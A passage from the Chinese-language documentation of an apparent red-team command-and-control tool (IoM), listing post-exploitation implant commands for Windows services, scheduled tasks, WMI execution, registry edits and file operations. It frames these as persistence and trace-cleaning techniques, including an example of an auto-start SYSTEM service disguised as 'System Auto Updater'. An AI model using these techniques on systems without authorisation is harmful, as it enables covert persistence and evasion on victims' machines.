\u7684\u81ea\u52a8\u542f\u52a8\u670d\u52a1\uff0c\u5173\u8054\u81f3\u7cfb\u7edf\u66f4\u65b0\u7a0b\u5e8f\uff1a <pre><code>service create --name updater_service --display \"System Auto Updater\" --path \"C:\\Windows\\system32\\svchost.exe -k netsvcs\" --start_type AutoStart --error Normal --account \"NT AUTHORITY\\SYSTEM\"\n</code></pre></p> <p>\u9009\u9879\u8bf4\u660e\uff1a  </p> <ul> <li> <p><code>--name string</code>\uff1a\u670d\u52a1\u540d\u79f0\uff08\u5fc5\u586b\uff09\uff0c\u53d6\u503c\u4e3a\u81ea\u5b9a\u4e49\u540d\u79f0\uff08\u5982 <code>updater_service</code>\uff09</p> </li> <li> <p><code>--display string</code>\uff1a\u670d\u52a1\u663e\u793a\u540d\u79f0\uff0c\u53d6\u503c\u4e3a\u63cf\u8ff0\u6027\u540d\u79f0\uff08\u5982 \"System Auto Updater\"\uff09</p> </li> <li> <p><code>--path string</code>\uff1a\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff08\u5fc5\u586b\uff09\uff0c\u53d6\u503c\u4e3a\u670d\u52a1\u5173\u8054\u7684\u7a0b\u5e8f\u8def\u5f84\uff08\u5982 <code>C:\\path\\to\\service.exe</code>\uff09</p> </li> <li> <p><code>--start_type string</code>\uff1a\u542f\u52a8\u7c7b\u578b\uff08\u9ed8\u8ba4 <code>AutoStart</code>\uff09\uff0c\u53d6\u503c\u8303\u56f4\u5305\u62ec <code>BootStart</code>\uff08\u5f15\u5bfc\u542f\u52a8\uff09\u3001<code>SystemStart</code>\uff08\u7cfb\u7edf\u542f\u52a8\uff09\u3001<code>AutoStart</code>\uff08\u81ea\u52a8\u542f\u52a8\uff09\u3001<code>DemandStart</code>\uff08\u624b\u52a8\u542f\u52a8\uff09\u3001<code>Disabled</code>\uff08\u7981\u7528\uff09</p> </li> <li> <p><code>--error string</code>\uff1a\u9519\u8bef\u63a7\u5236\u7ea7\u522b\uff08\u9ed8\u8ba4 <code>Normal</code>\uff09\uff0c\u53d6\u503c\u8303\u56f4\u5305\u62ec <code>Ignore</code>\uff08\u5ffd\u7565\u9519\u8bef\uff09\u3001<code>Normal</code>\uff08\u8bb0\u5f55\u9519\u8bef\uff09\u3001<code>Severe</code>\uff08\u4e25\u91cd\u9519\u8bef\uff09\u3001<code>Critical</code>\uff08\u81f4\u547d\u9519\u8bef\uff09</p> </li> <li> <p><code>--account string</code>\uff1a\u8fd0\u884c\u8d26\u6237\uff08\u9ed8\u8ba4 <code>LocalSystem</code>\uff09\uff0c\u53d6\u503c\u5305\u62ec <code>LocalSystem</code>\uff08\u672c\u5730\u7cfb\u7edf\uff09\u3001<code>NetworkService</code>\uff08\u7f51\u7edc\u670d\u52a1\uff09\u3001<code>NT AUTHORITY\\SYSTEM</code> \u7b49\u3002</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#service-delete","title":"service delete","text":"<p>\u6c38\u4e45\u5220\u9664\u6307\u5b9a\u670d\u52a1\uff0c\u4ece\u7cfb\u7edf\u4e2d\u79fb\u9664\u670d\u52a1\u914d\u7f6e\u3002 <pre><code>service delete [\u670d\u52a1\u540d\u79f0]\n</code></pre> \u793a\u4f8b\uff1a \u5220\u9664\u540d\u4e3a <code>updater_service</code> \u7684\u670d\u52a1\uff1a <pre><code>service delete updater_service\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#service-list","title":"service list","text":"<p>\u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u670d\u52a1\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u540d\u79f0\u3001\u663e\u793a\u540d\u79f0\u3001\u542f\u52a8\u7c7b\u578b\u3001\u5f53\u524d\u72b6\u6001\u7b49\u3002 <pre><code>service list\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#service-query","title":"service query","text":"<p>\u67e5\u8be2\u6307\u5b9a\u670d\u52a1\u7684\u914d\u7f6e\u4e0e\u72b6\u6001\uff08\u5982\u542f\u52a8\u7c7b\u578b\u3001\u8fd0\u884c\u72b6\u6001\u3001\u6267\u884c\u8def\u5f84\u7b49\uff09\u3002 <pre><code>service query [\u670d\u52a1\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u67e5\u8be2 Windows \u66f4\u65b0\u670d\u52a1\uff08<code>wuauserv</code>\uff09\u7684\u72b6\u6001\uff1a <pre><code>service query wuauserv\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#service-start","title":"service start","text":"<p>\u542f\u52a8\u6307\u5b9a\u670d\u52a1\uff0c\u4f7f\u5176\u8fdb\u5165\u8fd0\u884c\u72b6\u6001\u3002 <pre><code>service start [\u670d\u52a1\u540d\u79f0]\n</code></pre> \u793a\u4f8b\uff1a \u542f\u52a8\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\uff08<code>TermService</code>\uff09\uff1a <pre><code>service start TermService\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#service-stop","title":"service stop","text":"<p>\u505c\u6b62\u6307\u5b9a\u7684\u8fd0\u884c\u4e2d\u670d\u52a1\uff0c\u6682\u505c\u5176\u529f\u80fd\u3002</p> <pre><code>service stop [\u670d\u52a1\u540d\u79f0]\n</code></pre> <p>\u793a\u4f8b\uff1a \u505c\u6b62\u6587\u4ef6\u5171\u4eab\u670d\u52a1\uff08<code>lanmanserver</code>\uff09\uff1a <pre><code>service stop lanmanserver\n</code></pre></p> <p>\u60a8\u53ef\u4ee5\u5728gui\u4e2d\uff0c\u60a8\u53ef\u4ee5\u53f3\u51fb\u5bf9\u5e94session\uff0c\u70b9\u51fbShow Services\u6309\u94ae\u3002\u70b9\u51fb\u540e\uff0c\u5728\u53f3\u4fa7\u4f1a\u663e\u793a\u76ee\u6807\u7cfb\u7edf\u7684\u670d\u52a1\u4fe1\u606f\u3002 </p> <p></p>"},{"location":"IoM/guideline/post_exploitation/#\u8ba1\u5212\u4efb\u52a1\u7ba1\u7406","title":"\u8ba1\u5212\u4efb\u52a1\u7ba1\u7406","text":"<p><code>taskschd</code> \u547d\u4ee4\u7528\u4e8e\u7ba1\u7406 Windows \u7cfb\u7edf\u7684\u8ba1\u5212\u4efb\u52a1\uff0c\u652f\u6301\u521b\u5efa\u3001\u67e5\u8be2\u3001\u542f\u52a8\u3001\u505c\u6b62\u3001\u5220\u9664\u53ca\u7acb\u5373\u6267\u884c\u7b49\u64cd\u4f5c\uff0c\u662f\u5b9e\u73b0\u6301\u4e45\u5316\u6e17\u900f\u7684\u91cd\u8981\u624b\u6bb5\u3002</p> <p><pre><code>taskschd [\u5b50\u547d\u4ee4]\n</code></pre> \u652f\u6301\u7684\u5b50\u547d\u4ee4\u5305\u62ec\uff1a</p> <ul> <li> <p><code>taskschd create</code>\uff1a\u521b\u5efa\u65b0\u8ba1\u5212\u4efb\u52a1</p> </li> <li> <p><code>taskschd delete</code>\uff1a\u5220\u9664\u6307\u5b9a\u8ba1\u5212\u4efb\u52a1</p> </li> <li> <p><code>taskschd list</code>\uff1a\u5217\u51fa\u6240\u6709\u8ba1\u5212\u4efb\u52a1</p> </li> <li> <p><code>taskschd query</code>\uff1a\u67e5\u8be2\u8ba1\u5212\u4efb\u52a1\u914d\u7f6e</p> </li> <li> <p><code>taskschd run</code>\uff1a\u7acb\u5373\u6267\u884c\u8ba1\u5212\u4efb\u52a1</p> </li> <li> <p><code>taskschd start</code>\uff1a\u542f\u52a8\u8ba1\u5212\u4efb\u52a1</p> </li> <li> <p><code>taskschd stop</code>\uff1a\u505c\u6b62\u8fd0\u884c\u4e2d\u7684\u8ba1\u5212\u4efb\u52a1</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#taskschd-create","title":"taskschd create","text":"<p>\u521b\u5efa\u65b0\u8ba1\u5212\u4efb\u52a1\uff0c\u53ef\u6307\u5b9a\u4efb\u52a1\u540d\u79f0\u3001\u6267\u884c\u8def\u5f84\u3001\u89e6\u53d1\u7c7b\u578b\u53ca\u542f\u52a8\u65f6\u95f4\u7b49\u53c2\u6570\u3002 <pre><code>taskschd create [flags]\n</code></pre> \u793a\u4f8b\uff1a \u521b\u5efa\u4e00\u4e2a\u6bcf\u65e5 9 \u70b9\u6267\u884c\u7cfb\u7edf\u68c0\u67e5\u7684\u8ba1\u5212\u4efb\u52a1\uff1a <pre><code>taskschd create --name \"DailySystemCheck\" --path \"C:\\Windows\\system32\\check.exe\" --trigger_type Daily --start_boundary \"2023-10-10T09:00:00\"\n</code></pre></p> <p>\u9009\u9879\u8bf4\u660e\uff1a - <code>--name string</code>\uff1a\u8ba1\u5212\u4efb\u52a1\u540d\u79f0\uff08\u5fc5\u586b\uff09\uff0c\u53d6\u503c\u4e3a\u81ea\u5b9a\u4e49\u540d\u79f0\uff08\u5982 \"DailySystemCheck\"\uff09</p> <ul> <li> <p><code>--path string</code>\uff1a\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff08\u5fc5\u586b\uff09\uff0c\u53d6\u503c\u4e3a\u4efb\u52a1\u5173\u8054\u7684\u7a0b\u5e8f\u8def\u5f84\uff08\u5982 <code>C:\\path\\to\\script.exe</code>\uff09</p> </li> <li> <p><code>--trigger_type string</code>\uff1a\u89e6\u53d1\u7c7b\u578b\uff0c\u53d6\u503c\u5305\u62ec <code>Daily</code>\uff08\u6bcf\u65e5\uff09\u3001<code>Weekly</code>\uff08\u6bcf\u5468\uff09\u3001<code>Monthly</code>\uff08\u6bcf\u6708\uff09\u7b49</p> </li> <li> <p><code>--start_boundary string</code>\uff1a\u542f\u52a8\u65f6\u95f4\u70b9\uff0c\u683c\u5f0f\u4e3a <code>YYYY-MM-DDTHH:MM:SS</code>\uff08\u5982 \"2023-10-10T09:00:00\"\uff09</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#taskschd-delete","title":"taskschd delete","text":"<p>\u5220\u9664\u6307\u5b9a\u7684\u8ba1\u5212\u4efb\u52a1\uff0c\u4ece\u7cfb\u7edf\u4e2d\u79fb\u9664\u4efb\u52a1\u914d\u7f6e\u3002 <pre><code>taskschd delete [\u4efb\u52a1\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u5220\u9664\u540d\u4e3a \"DailySystemCheck\" \u7684\u8ba1\u5212\u4efb\u52a1\uff1a <pre><code>taskschd delete DailySystemCheck\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#taskschd-list","title":"taskschd list","text":"<p>\u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u8ba1\u5212\u4efb\u52a1\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec\u4efb\u52a1\u540d\u79f0\u3001\u72b6\u6001\u3001\u89e6\u53d1\u65b9\u5f0f\u7b49\u3002 <pre><code>taskschd list\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u67e5\u770b\u6240\u6709\u8ba1\u5212\u4efb\u52a1\uff08\u5305\u542b\u7cfb\u7edf\u9ed8\u8ba4\u4efb\u52a1\u5982 \"WindowsUpdate\" \u7b49\uff09\uff1a <pre><code>taskschd list\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#taskschd-query","title":"taskschd query","text":"<p>\u67e5\u8be2\u6307\u5b9a\u8ba1\u5212\u4efb\u52a1\u7684\u8be6\u7ec6\u914d\u7f6e\uff0c\u5305\u62ec\u6267\u884c\u8def\u5f84\u3001\u89e6\u53d1\u6761\u4ef6\u3001\u8fd0\u884c\u72b6\u6001\u7b49\u3002 <pre><code>taskschd query [\u4efb\u52a1\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u67e5\u8be2 \"WindowsUpdate\" \u8ba1\u5212\u4efb\u52a1\u7684\u914d\u7f6e\uff1a <pre><code>taskschd query WindowsUpdate\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#taskschd-run","title":"taskschd run","text":"<p>\u7acb\u5373\u6267\u884c\u6307\u5b9a\u7684\u8ba1\u5212\u4efb\u52a1\uff0c\u65e0\u9700\u7b49\u5f85\u89e6\u53d1\u65f6\u95f4\u3002</p> <pre><code>taskschd run [\u4efb\u52a1\u540d\u79f0]\n</code></pre> <p>\u793a\u4f8b\uff1a \u7acb\u5373\u6267\u884c \"DailySystemCheck\" \u8ba1\u5212\u4efb\u52a1\uff1a <pre><code>taskschd run DailySystemCheck\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#taskschd-start","title":"taskschd start","text":"<p>\u542f\u52a8\u8ba1\u5212\u4efb\u52a1\uff0c\u4f7f\u5176\u6309\u914d\u7f6e\u7684\u89e6\u53d1\u6761\u4ef6\u8fd0\u884c\u3002 <pre><code>taskschd start [\u4efb\u52a1\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u542f\u52a8 \"WeeklyBackup\" \u8ba1\u5212\u4efb\u52a1\uff1a <pre><code>taskschd start WeeklyBackup\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#taskschd-stop","title":"taskschd stop","text":"<p>\u505c\u6b62\u6b63\u5728\u8fd0\u884c\u7684\u8ba1\u5212\u4efb\u52a1\uff0c\u7ec8\u6b62\u5176\u5f53\u524d\u6267\u884c\u8fc7\u7a0b\u3002 <pre><code>taskschd stop [\u4efb\u52a1\u540d\u79f0]\n</code></pre></p> <p>\u793a\u4f8b\uff1a \u505c\u6b62\u6b63\u5728\u8fd0\u884c\u7684 \"DailySystemCheck\" \u8ba1\u5212\u4efb\u52a1\uff1a <pre><code>taskschd stop DailySystemCheck\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#wmi-\u64cd\u4f5c","title":"WMI \u64cd\u4f5c","text":""},{"location":"IoM/guideline/post_exploitation/#wmi-\u67e5\u8be2\u4e0e\u6267\u884c","title":"WMI \u67e5\u8be2\u4e0e\u6267\u884c","text":"<p>\u901a\u8fc7WMI\uff08Windows Management Instrumentation\uff09\u63a5\u53e3\u4e0e\u76ee\u6807\u7cfb\u7edf\u4ea4\u4e92\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#wmi-\u67e5\u8be2","title":"WMI \u67e5\u8be2","text":"<p><pre><code>wmi_query [flags]\n</code></pre> \u5728\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\u4e2d\u6267\u884cWMI\u67e5\u8be2\uff0c\u83b7\u53d6\u7cfb\u7edf\u4fe1\u606f\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--namespace string</code>: WMI\u547d\u540d\u7a7a\u95f4\uff08\u5982 root\\cimv2\uff09</p> </li> <li> <p><code>--args strings</code>: WMI\u67e5\u8be2\u53c2\u6570</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>wmi_query --namespace root\\\\cimv2 --args \"SELECT * FROM Win32_Process\"\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#wmi-\u65b9\u6cd5\u6267\u884c","title":"WMI \u65b9\u6cd5\u6267\u884c","text":"<p><pre><code>wmi_execute [flags]\n</code></pre> \u6267\u884cWMI\u7c7b\u4e2d\u7684\u6307\u5b9a\u65b9\u6cd5\uff0c\u5b9e\u73b0\u7cfb\u7edf\u64cd\u4f5c\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>--namespace string</code>: WMI\u547d\u540d\u7a7a\u95f4\uff08\u5982 root\\cimv2\uff09</p> </li> <li> <p><code>--class_name string</code>: WMI\u7c7b\u540d</p> </li> <li> <p><code>--method_name string</code>: WMI\u65b9\u6cd5\u540d</p> </li> <li> <p><code>--params strings</code>: WMI\u65b9\u6cd5\u53c2\u6570</p> </li> </ul> <p>\u793a\u4f8b: <pre><code># \u6267\u884cWMI\u65b9\u6cd5\u521b\u5efa\u8fdb\u7a0b\nwmi_execute --namespace root\\\\cimv2 --class_name Win32_Process --method_name Create --params CommandLine=\"notepad.exe\"\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u6ce8\u518c\u8868\u64cd\u4f5c","title":"\u6ce8\u518c\u8868\u64cd\u4f5c","text":"<p><code>reg</code> \u547d\u4ee4\u7528\u4e8e\u7ba1\u7406 Windows \u7cfb\u7edf\u6ce8\u518c\u8868\uff0c\u652f\u6301\u67e5\u8be2\u3001\u6dfb\u52a0\u3001\u5220\u9664\u6ce8\u518c\u8868\u9879\uff0c\u4ee5\u53ca\u5217\u51fa\u5b50\u9879\u548c\u503c\u7b49\u64cd\u4f5c\uff0c\u53ef\u7528\u4e8e\u914d\u7f6e\u4fee\u6539\u3001\u75d5\u8ff9\u6e05\u7406\u6216\u6301\u4e45\u5316\u8bbe\u7f6e\u3002 <pre><code>reg [\u5b50\u547d\u4ee4]\n</code></pre> \u652f\u6301\u7684\u5b50\u547d\u4ee4\u5305\u62ec\uff1a</p> <ul> <li> <p><code>reg add</code>\uff1a\u6dfb\u52a0\u6216\u4fee\u6539\u6ce8\u518c\u8868\u9879</p> </li> <li> <p><code>reg delete</code>\uff1a\u5220\u9664\u6307\u5b9a\u6ce8\u518c\u8868\u9879</p> </li> <li> <p><code>reg list_key</code>\uff1a\u5217\u51fa\u6ce8\u518c\u8868\u8def\u5f84\u4e0b\u7684\u6240\u6709\u5b50\u9879</p> </li> <li> <p><code>reg list_value</code>\uff1a\u5217\u51fa\u6ce8\u518c\u8868\u8def\u5f84\u4e0b\u7684\u6240\u6709\u503c</p> </li> <li> <p><code>reg query</code>\uff1a\u67e5\u8be2\u6307\u5b9a\u6ce8\u518c\u8868\u9879\u7684\u503c</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#reg-add","title":"reg add","text":"<p>\u6dfb\u52a0\u65b0\u7684\u6ce8\u518c\u8868\u9879\u6216\u4fee\u6539\u5df2\u6709\u9879\uff0c\u652f\u6301 <code>REG_SZ</code>\uff08\u5b57\u7b26\u4e32\uff09\u3001<code>REG_BINARY</code>\uff08\u4e8c\u8fdb\u5236\uff09\u3001<code>REG_DWORD</code>\uff0832\u4f4d\u6574\u6570\uff09\u3001<code>REG_QWORD</code>\uff0864\u4f4d\u6574\u6570\uff09\u56db\u79cd\u503c\u7c7b\u578b\u3002</p> <pre><code>reg add [\u6ce8\u518c\u8868\u8def\u5f84] [flags]\n</code></pre> <p>\u793a\u4f8b\uff1a 1. \u6dfb\u52a0 32 \u4f4d\u6574\u6570\u7c7b\u578b\u7684\u6ce8\u518c\u8868\u9879\uff08\u7528\u4e8e\u542f\u7528\u67d0\u529f\u80fd\uff09\uff1a    <pre><code>reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies -v EnableFeature -t REG_DWORD -d 1\n</code></pre> 2. \u6dfb\u52a0\u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u6ce8\u518c\u8868\u9879\uff08\u7528\u4e8e\u914d\u7f6e\u8def\u5f84\uff09\uff1a    <pre><code>reg add HKEY_CURRENT_USER\\\\Software\\\\CustomApp -v InstallPath -t REG_SZ -d \"C:\\\\Program Files\\\\CustomApp\"\n</code></pre> 3. \u6dfb\u52a0\u4e8c\u8fdb\u5236\u7c7b\u578b\u7684\u6ce8\u518c\u8868\u9879\uff08\u7528\u4e8e\u5b58\u50a8\u52a0\u5bc6\u6570\u636e\uff09\uff1a    <pre><code>reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\SecureData -v EncKey -t REG_BINARY -d 0A1B2C3D4E5F\n</code></pre></p> <p>\u9009\u9879\u8bf4\u660e\uff1a - <code>-v, --value string</code>\uff1a\u6ce8\u518c\u8868\u9879\u7684\u201c\u503c\u540d\u79f0\u201d\uff08\u5fc5\u586b\uff09\uff0c\u5982 <code>EnableFeature</code>\u3001<code>InstallPath</code></p> <ul> <li> <p><code>-t, --type string</code>\uff1a\u503c\u7c7b\u578b\uff08\u9ed8\u8ba4 <code>REG_SZ</code>\uff09\uff0c\u53d6\u503c\u5305\u62ec <code>REG_SZ</code>\uff08\u5b57\u7b26\u4e32\uff09\u3001<code>REG_BINARY</code>\uff08\u4e8c\u8fdb\u5236\uff09\u3001<code>REG_DWORD</code>\uff0832\u4f4d\u6574\u6570\uff09\u3001<code>REG_QWORD</code>\uff0864\u4f4d\u6574\u6570\uff09</p> </li> <li> <p><code>-d, --data string</code>\uff1a\u6ce8\u518c\u8868\u9879\u7684\u201c\u503c\u6570\u636e\u201d\uff08\u5fc5\u586b\uff09\uff0c\u9700\u4e0e\u503c\u7c7b\u578b\u5339\u914d\uff08\u5982 <code>REG_DWORD</code> \u7c7b\u578b\u586b\u6570\u5b57 <code>1</code>\uff0c<code>REG_BINARY</code> \u7c7b\u578b\u586b\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32 <code>0A1B</code>\uff09</p> </li> </ul>"},{"location":"IoM/guideline/post_exploitation/#reg-delete","title":"reg delete","text":"<p>\u5220\u9664\u6307\u5b9a\u7684\u6ce8\u518c\u8868\u9879\uff0c\u5305\u62ec\u5176\u5173\u8054\u7684\u503c\u6570\u636e\uff08\u9700\u6ce8\u610f\uff1a\u5220\u9664\u7cfb\u7edf\u5173\u952e\u9879\u53ef\u80fd\u5bfc\u81f4\u7cfb\u7edf\u5f02\u5e38\uff09\u3002</p> <pre><code>reg delete [\u6ce8\u518c\u8868\u8def\u5f84] [\u9879\u540d\u79f0]\n</code></pre> <p>\u793a\u4f8b\uff1a \u5220\u9664\u81ea\u5b9a\u4e49\u5e94\u7528\u7684\u6ce8\u518c\u8868\u914d\u7f6e\u9879\uff1a <pre><code>reg delete HKEY_CURRENT_USER\\\\Software\\\\CustomApp InstallPath\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#reg-list_key","title":"reg list_key","text":"<p>\u5217\u51fa\u6307\u5b9a\u6ce8\u518c\u8868\u8def\u5f84\u4e0b\u7684\u6240\u6709\u5b50\u9879\uff0c\u4e86\u89e3\u8be5\u8def\u5f84\u4e0b\u7684\u5c42\u7ea7\u7ed3\u6784\u3002</p> <pre><code>reg list_key [\u6ce8\u518c\u8868\u8def\u5f84]\n</code></pre> <p>\u793a\u4f8b\uff1a \u67e5\u770b Windows \u7b56\u7565\u76f8\u5173\u7684\u6ce8\u518c\u8868\u5b50\u9879\uff1a <pre><code>reg list_key HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#reg-list_value","title":"reg list_value","text":"<p>\u5217\u51fa\u6307\u5b9a\u6ce8\u518c\u8868\u8def\u5f84\u4e0b\u7684\u6240\u6709\u201c\u503c\u540d\u79f0\u201d\u548c\u5bf9\u5e94\u7684\u6570\u636e\uff0c\u5feb\u901f\u638c\u63e1\u8be5\u8def\u5f84\u4e0b\u7684\u914d\u7f6e\u4fe1\u606f\u3002</p> <pre><code>reg list_value [\u6ce8\u518c\u8868\u8def\u5f84]\n</code></pre> <p>\u793a\u4f8b\uff1a \u67e5\u770b\u5f53\u524d\u7528\u6237\u81ea\u5b9a\u4e49\u5e94\u7528\u7684\u6240\u6709\u6ce8\u518c\u8868\u914d\u7f6e\u503c\uff1a <pre><code>reg list_value HKEY_CURRENT_USER\\\\Software\\\\CustomApp\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#reg-query","title":"reg query","text":"<p>\u67e5\u8be2\u6307\u5b9a\u6ce8\u518c\u8868\u9879\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u503c\u7c7b\u578b\u548c\u503c\u6570\u636e\uff0c\u9a8c\u8bc1\u914d\u7f6e\u662f\u5426\u751f\u6548\u3002</p> <pre><code>reg query [\u6ce8\u518c\u8868\u8def\u5f84] [\u9879\u540d\u79f0]\n</code></pre> <p>\u793a\u4f8b\uff1a \u67e5\u8be2 Windows \u66f4\u65b0\u670d\u52a1\u7684\u6ce8\u518c\u8868\u914d\u7f6e\uff1a <pre><code>reg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\wuauserv Start\n</code></pre> \uff08\u6ce8\uff1a<code>Start</code> \u662f\u6ce8\u518c\u8868\u9879\u7684\u201c\u503c\u540d\u79f0\u201d\uff0c\u7528\u4e8e\u63a7\u5236\u670d\u52a1\u542f\u52a8\u7c7b\u578b\uff0c\u8fd4\u56de\u7684 <code>REG_DWORD</code> \u7c7b\u578b\u6570\u636e <code>2</code> \u4ee3\u8868\u201c\u81ea\u52a8\u542f\u52a8\u201d\uff0c<code>3</code> \u4ee3\u8868\u201c\u624b\u52a8\u542f\u52a8\u201d\uff09</p>"},{"location":"IoM/guideline/post_exploitation/#\u6587\u4ef6\u64cd\u4f5c","title":"\u6587\u4ef6\u64cd\u4f5c","text":""},{"location":"IoM/guideline/post_exploitation/#\u57fa\u7840\u6587\u4ef6\u64cd\u4f5c","title":"\u57fa\u7840\u6587\u4ef6\u64cd\u4f5c","text":"<p>\u5bf9\u76ee\u6807\u7cfb\u7edf\u7684\u6587\u4ef6\u4e0e\u76ee\u5f55\u8fdb\u884c\u7ba1\u7406\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u5217\u51fa\u76ee\u5f55","title":"\u5217\u51fa\u76ee\u5f55","text":"<p><pre><code>ls [path]\n</code></pre> \u5217\u51fa\u6307\u5b9a\u8def\u5f84\u7684\u76ee\u5f55\u5185\u5bb9\uff0c\u5305\u62ec\u6587\u4ef6\u4e0e\u5b50\u76ee\u5f55\u3002</p> <p>\u793a\u4f8b: <pre><code>ls /tmp\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5207\u6362\u76ee\u5f55","title":"\u5207\u6362\u76ee\u5f55","text":"<p><pre><code>cd\n</code></pre> \u66f4\u6539\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\uff0c\u5f71\u54cd\u540e\u7eed\u6587\u4ef6\u64cd\u4f5c\u7684\u9ed8\u8ba4\u8def\u5f84\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u663e\u793a\u5f53\u524d\u76ee\u5f55","title":"\u663e\u793a\u5f53\u524d\u76ee\u5f55","text":"<p><pre><code>pwd\n</code></pre> \u663e\u793a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u7684\u7edd\u5bf9\u8def\u5f84\u3002</p>"},{"location":"IoM/guideline/post_exploitation/#\u521b\u5efa\u76ee\u5f55","title":"\u521b\u5efa\u76ee\u5f55","text":"<p><pre><code>mkdir [path]\n</code></pre> \u5728\u6307\u5b9a\u8def\u5f84\u521b\u5efa\u65b0\u76ee\u5f55\u3002</p> <p>\u793a\u4f8b: <pre><code>mkdir /tmp\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u590d\u5236\u6587\u4ef6","title":"\u590d\u5236\u6587\u4ef6","text":"<p><pre><code>cp [source] [target]\n</code></pre> \u590d\u5236\u6587\u4ef6\u6216\u76ee\u5f55\u5230\u76ee\u6807\u8def\u5f84\u3002</p> <p>\u793a\u4f8b: <pre><code>cp /tmp/file.txt /tmp/file2.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u79fb\u52a8\u6587\u4ef6","title":"\u79fb\u52a8\u6587\u4ef6","text":"<p><pre><code>mv [source] [target]\n</code></pre> \u79fb\u52a8\u6587\u4ef6\u6216\u76ee\u5f55\u5230\u76ee\u6807\u8def\u5f84\uff08\u53ef\u7528\u4e8e\u91cd\u547d\u540d\uff09\u3002</p> <p>\u793a\u4f8b: <pre><code>mv /tmp/file.txt /tmp/file2.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u5220\u9664\u6587\u4ef6","title":"\u5220\u9664\u6587\u4ef6","text":"<p><pre><code>rm [file]\n</code></pre> \u5220\u9664\u6307\u5b9a\u6587\u4ef6\u6216\u76ee\u5f55\u3002</p> <p>\u793a\u4f8b: <pre><code>rm /tmp/file.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u67e5\u770b\u6587\u4ef6\u5185\u5bb9","title":"\u67e5\u770b\u6587\u4ef6\u5185\u5bb9","text":"<p><pre><code>cat [implant_file]\n</code></pre> \u663e\u793a\u6307\u5b9a\u6587\u4ef6\u7684\u5185\u5bb9\u3002</p> <p>\u793a\u4f8b: <pre><code>cat file.txt\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u4fee\u6539\u6587\u4ef6\u6743\u9650","title":"\u4fee\u6539\u6587\u4ef6\u6743\u9650","text":"<p><pre><code>chmod [file] [mode]\n</code></pre> \u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\uff08\u9002\u7528\u4e8e\u7c7bUnix\u7cfb\u7edf\uff09\u3002</p> <p>\u793a\u4f8b: <pre><code>chmod ./file.txt 644\n</code></pre></p>"},{"location":"IoM/guideline/post_exploitation/#\u4fee\u6539\u6587\u4ef6\u6240\u6709\u8005","title":"\u4fee\u6539\u6587\u4ef6\u6240\u6709\u8005","text":"<p><pre><code>chown [file] [user] [flags]\n</code></pre> \u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u6709\u8005\uff08\u9002\u7528\u4e8e\u7c7bUnix\u7cfb\u7edf\uff09\u3002</p> <p>\u9009\u9879:</p> <ul> <li> <p><code>-g, --gid string</code>: \u7ec4ID</p> </li> <li> <p><code>-r, --recursive</code>: \u9012\u5f52\u4fee\u6539\u5b50\u76ee\u5f55\u4e0e\u6587\u4ef6</p> </li> </ul> <p>\u793a\u4f8b: <pre><code>chown user 